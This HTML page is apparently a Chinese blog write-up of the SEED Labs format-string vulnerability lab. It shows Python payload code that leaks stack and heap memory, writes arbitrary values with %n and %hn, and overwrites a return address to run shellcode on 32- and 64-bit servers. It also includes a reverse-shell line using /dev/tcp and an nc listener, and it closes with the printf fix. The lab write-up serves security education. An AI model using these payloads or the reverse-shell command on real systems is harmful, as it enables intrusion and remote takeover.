@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Task 1: Crashing the ProgramTask 2: Printing Out the Server Program’s MemoryTask 2.A: Stack Data将输入串的第一个字节设置为 0x11111111，后面多搞几个 .%x，经过测试得到需要 64 个就能输出这个数字。  Task 2.B: Heap Data上面说了，需要 64 个，如果我们把第 64 个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Format-String-Vulnerability Lab">
+<meta property="og:url" content="https://ceyewan.github.io/p/a4ae304e.html">
+<meta property="og:site_name" content="Ceyewan&#39;s Blog">
+<meta property="og:description" content="Task 1: Crashing the ProgramTask 2: Printing Out the Server Program’s MemoryTask 2.A: Stack Data将输入串的第一个字节设置为 0x11111111，后面多搞几个 .%x，经过测试得到需要 64 个就能输出这个数字。  Task 2.B: Heap Data上面说了，需要 64 个，如果我们把第 64 个">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114204048516.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114203909585.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114205838655.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114225525264.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114231617151.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114235712516.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115000038443.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115002949418.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115003824042.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115010621345.png">
+<meta property="og:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115010819045.png">
+<meta property="article:published_time" content="2022-11-14T17:14:04.000Z">
+<meta property="article:modified_time" content="2024-03-28T16:22:46.275Z">
+<meta property="article:author" content="ceyewan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114204048516.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icons.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon-apple-touch.png">
+        
+      
+    
+    <!-- title -->
+    <title>Format-String-Vulnerability Lab</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/p/5e644521.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/p/a7d9c628.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/a4ae304e.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/a4ae304e.html&text=Format-String-Vulnerability Lab"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/a4ae304e.html&is_video=false&description=Format-String-Vulnerability Lab"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format-String-Vulnerability Lab&body=Check out this article: https://ceyewan.github.io/p/a4ae304e.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/a4ae304e.html&title=Format-String-Vulnerability Lab"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/a4ae304e.html&name=Format-String-Vulnerability Lab&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/a4ae304e.html&t=Format-String-Vulnerability Lab"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-Crashing-the-Program"><span class="toc-number">1.</span> <span class="toc-text">Task 1: Crashing the Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-Printing-Out-the-Server-Program%E2%80%99s-Memory"><span class="toc-number">2.</span> <span class="toc-text">Task 2: Printing Out the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-A-Stack-Data"><span class="toc-number">2.1.</span> <span class="toc-text">Task 2.A: Stack Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-B-Heap-Data"><span class="toc-number">2.2.</span> <span class="toc-text">Task 2.B: Heap Data</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-3-Modifying-the-Server-Program%E2%80%99s-Memory"><span class="toc-number">3.</span> <span class="toc-text">Task 3: Modifying the Server Program’s Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-A-Change-the-value-to-a-different-value"><span class="toc-number">3.1.</span> <span class="toc-text">Task 3.A: Change the value to a different value.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-B-Change-the-value-to-0x5000"><span class="toc-number">3.2.</span> <span class="toc-text">Task 3.B: Change the value to 0x5000</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-3-C-Change-the-value-to-0xAABBCCDD"><span class="toc-number">3.3.</span> <span class="toc-text">Task 3.C: Change the value to 0xAABBCCDD.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-4-Inject-Malicious-Code-into-the-Server-Program"><span class="toc-number">4.</span> <span class="toc-text">Task 4: Inject Malicious Code into the Server Program</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-5-Attacking-the-64-bit-Server-Program"><span class="toc-number">5.</span> <span class="toc-text">Task 5: Attacking the 64-bit Server Program</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">5.1.</span> <span class="toc-text">一个小技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-content-0-%E7%9A%84%E5%81%8F%E7%A7%BB"><span class="toc-number">5.2.</span> <span class="toc-text">测试 content[0] 的偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-shellcode"><span class="toc-number">5.3.</span> <span class="toc-text">构造 shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91-shell"><span class="toc-number">5.4.</span> <span class="toc-text">反向 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-6-Fixing-the-Problem"><span class="toc-number">6.</span> <span class="toc-text">Task 6: Fixing the Problem</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Format-String-Vulnerability Lab
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">ceyewan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-14T17:14:04.000Z" class="dt-published" itemprop="datePublished">2022-11-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/SeedLabs-SoftwareSecurity/">SeedLabs/SoftwareSecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>将输入串的第一个字节设置为 <code>0x11111111</code>，后面多搞几个 <code>.%x</code>，经过测试得到需要 <code>64</code> 个就能输出这个数字。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114204048516.png" alt="image-20221114204048516"></p>
+<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>上面说了，需要 <code>64</code> 个，如果我们把第 <code>64</code> 个 <code>.%x</code> 修改为 <code>.%s</code>，那么就是输出 <code>0x11111111</code> 这个地址的字符串。现在我们需要输出 <code>secret</code> 字符串，那么就把这个地址修改为 <code>secret</code> 的地址即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content[<span class="number">0</span>:<span class="number">4</span>] = (<span class="number">0x080b4008</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">4</span> + <span class="number">3</span> * <span class="number">64</span>] = (<span class="string">&quot;.%x&quot;</span> * <span class="number">63</span> + <span class="string">&quot;.%s&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以得到结果：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114203909585.png" alt="image-20221114203909585"></p>
+<h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content[<span class="number">0</span>:<span class="number">4</span>] = (<span class="number">0x080e5068</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">4</span> + <span class="number">3</span> * <span class="number">64</span>] = (<span class="string">&quot;.%x&quot;</span> * <span class="number">63</span> + <span class="string">&quot;.%n&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114205838655.png" alt="image-20221114205838655"></p>
+<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 4 + 316 + 320 * 63 = 0x5000</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">4</span>+<span class="number">633</span>] = (<span class="string">&quot;.&quot;</span> * <span class="number">316</span> + <span class="string">&quot;%320x&quot;</span> * <span class="number">63</span> + <span class="string">&quot;%n&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114225525264.png" alt="image-20221114225525264"></p>
+<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content[<span class="number">0</span>:<span class="number">4</span>] = (<span class="number">0x080e506a</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 用来写入 AABB</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>] = <span class="string">&quot;@@@@&quot;</span>.encode(<span class="string">&#x27;latin-1&#x27;</span>)  <span class="comment"># 用来 %(CCDD - AABB)x 时读取</span></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (<span class="number">0x080e5068</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 用来写入 CCDD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12 + 36 + 693 × 63 = 43707 = 0xAABB; 0xAABB + 8738 = 0xCCDD</span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="number">363</span>] = (<span class="string">&quot;.&quot;</span> * <span class="number">36</span> + <span class="string">&quot;%693x&quot;</span> * <span class="number">63</span> + <span class="string">&quot;%hn&quot;</span> +</span><br><span class="line">                      <span class="string">&quot;%8738x&quot;</span> + <span class="string">&quot;%hn&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114231617151.png" alt="image-20221114231617151"></p>
+<h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>通过输出我们知道，我们 <code>ebp = 0xffffd6d8</code>，那么返回地址就是 <code>0xffffd6dc</code>。为了实现攻击，我们需要修改这个地址上的值，修改为我们 <code>shellcode</code> 的地址。输入地址 <code>&amp;input</code> 是 <code>0xffffd7b0</code>，那么我们可以选择修改为 <code>0xffffd7b0 + 0x300</code>，也就是 <code>0xffffdab0</code>。</p>
+<p>好的，现在我们目标就是把地址 <code>0xffffd6dc</code> 的值修改为 <code>0xffffdab0</code> 。和上面修改内存同理，不过需要算下数就是了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">1500</span> - <span class="built_in">len</span>(shellcode)  <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>] = (<span class="number">0xffffd6dc</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 用来写入 dab0</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>] = <span class="string">&quot;@@@@&quot;</span>.encode(<span class="string">&#x27;latin-1&#x27;</span>)  <span class="comment"># 用来 %(ffff - dab0)x 时读取</span></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (<span class="number">0xffffd6de</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 用来写入 ffff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0xdab0</span> - <span class="number">62</span>*<span class="number">8</span>) <span class="comment"># 用来做 16 进制计算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0xffff</span> - <span class="number">0xdab0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="number">205</span>] = (<span class="string">&quot;%8x&quot;</span> * <span class="number">62</span> + <span class="string">&quot;%55476x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +</span><br><span class="line">                      <span class="string">&quot;%9551x&quot;</span> + <span class="string">&quot;%hn&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221114235712516.png" alt="image-20221114235712516"></p>
+<p>拿到反向 <code>shell</code> 也很简单，之间做过很多次了，把 shellcode 中 ls 那一行修改为 <code>&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</code>，然后在本地执行 <code>nc -nv -l 9090</code> 监听本地 9090 端口的 tcp 连接。然后重新发起攻击，不出意外就能拿到反向 <code>shell</code>。</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115000038443.png" alt="image-20221115000038443"></p>
+<h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><h3 id="一个小技巧"><a href="#一个小技巧" class="headerlink" title="一个小技巧"></a>一个小技巧</h3><p>自由的移动参数指针。我们可以使用 <code>k$</code> 将参数移动到第 <code>k</code> 个参数的位置。比如 <code>%3$.20x</code> 表示将参数移动到第 <code>3</code> 个，然后以 <code>%.20x</code> 的格式输出。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> var = <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3$.20x%6$n%2$10x\n&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, &amp;var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value in var: %d\n&quot;</span>,var);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移动到第 3 个参数，以 %.20x 的格式输出，移动到第 6 个参数，以 %n 的格式输出</span></span><br><span class="line"><span class="comment">// 移动到第 2 个参数，以 %10x 的参数输出</span></span><br><span class="line"><span class="comment">// 00000000000000000003         2</span></span><br><span class="line"><span class="comment">// The value in var: 20</span></span><br></pre></td></tr></table></figure>
+
+<p>我们先随便测试一下代码，拿到一些地址数据：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115002949418.png" alt="image-20221115002949418"></p>
+<p>我们的任务，就是把 <code>0x00007fffffffe620 + 8</code> 处的值，修改为 <code>0x00007fffffffe6e0 + 0x300</code>。分解任务：</p>
+<ul>
+<li><p>将 <code>0x00007fffffffe628</code> 的值修改为 <code>e9e0</code></p>
+</li>
+<li><p>将 <code>0x00007fffffffe62a</code> 的值修改为 <code>ffff</code></p>
+</li>
+<li><p>将 <code>0x00007fffffffe62c</code> 的值修改为 <code>7fff</code></p>
+<p>将 <code>0x00007fffffffe62e</code> 的值修改为 <code>0000</code></p>
+</li>
+</ul>
+<h3 id="测试-content-0-的偏移"><a href="#测试-content-0-的偏移" class="headerlink" title="测试 content[0] 的偏移"></a>测试 content[0] 的偏移</h3><p>将输入串的第一个字节设置为 <code>0x1111111111111111</code>，后面多搞几个 <code>.%lx</code>，经过测试得到需要 <code>34</code> 个就能输出这个数字。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content[<span class="number">0</span>:<span class="number">8</span>] = (<span class="number">0x1111111111111111</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">content[<span class="number">8</span>:<span class="number">8</span>+<span class="number">136</span>] = (<span class="string">&quot;.%lx&quot;</span> * <span class="number">34</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115003824042.png" alt="image-20221115003824042"></p>
+<h3 id="构造-shellcode"><a href="#构造-shellcode" class="headerlink" title="构造 shellcode"></a>构造 shellcode</h3><p>注意，修改为 <code>64</code> 位的 <code>shellcode</code>。然后我们把有 <code>0</code> 的地址放在比较后面，让 <code>str</code> 先执行。<code>%62$hn</code> 表示把参数移动到第 <code>62</code> 个（<code>content[0]</code> 是第 <code>34</code> 个，那么 <code>content[224]</code> 就是第 <code>34 + 224 / 8</code> 个，也就是第 <code>62</code> 个。然后，<code>%1$32767lx</code> 表示把参数移动到第 <code>1</code> （随便是几都行）个，输出 <code>0x7fff</code> 次。后面的依次类推。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">1500</span> - <span class="built_in">len</span>(shellcode)  <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line">content[<span class="number">200</span>:<span class="number">208</span>] = (<span class="number">0x00007fffffffe628</span>).to_bytes(</span><br><span class="line">    <span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 填入 e9e0</span></span><br><span class="line">content[<span class="number">208</span>:<span class="number">216</span>] = (<span class="number">0x00007fffffffe62a</span>).to_bytes(</span><br><span class="line">    <span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 填入 ffff</span></span><br><span class="line">content[<span class="number">216</span>:<span class="number">224</span>] = (<span class="number">0x00007fffffffe62c</span>).to_bytes(</span><br><span class="line">    <span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 填入 7fff</span></span><br><span class="line">content[<span class="number">224</span>:<span class="number">232</span>] = (<span class="number">0x00007fffffffe62e</span>).to_bytes(</span><br><span class="line">    <span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># 填入 0000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0x7fff</span>, <span class="number">0xe9e0</span> - <span class="number">0x7fff</span>, <span class="number">0xffff</span> - <span class="number">0xe9e0</span>) <span class="comment"># 32767 27105 5663</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;%62$hn%1$32767lx%61$hn%1$27105lx%59$hn%1$5663lx%60$hn&quot;</span></span><br><span class="line">content[<span class="number">0</span>:<span class="built_in">len</span>(<span class="built_in">str</span>)] = <span class="built_in">str</span>.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"><span class="comment">############################################################</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115010621345.png" alt="image-20221115010621345"></p>
+<h3 id="反向-shell"><a href="#反向-shell" class="headerlink" title="反向 shell"></a>反向 shell</h3><p>修改一下 <code>shellcode</code>，然后建立一个 <code>tcp</code> 连接，最后发起攻击即可：</p>
+<p><img src="https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221115010819045.png" alt="image-20221115010819045"></p>
+<h2 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h2><p>修改代码 <code>printf(msg);</code> 为 <code>printf(&quot;%s&quot;, msg);</code>，攻击肯定就失效了，输入什么就会输出什么。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
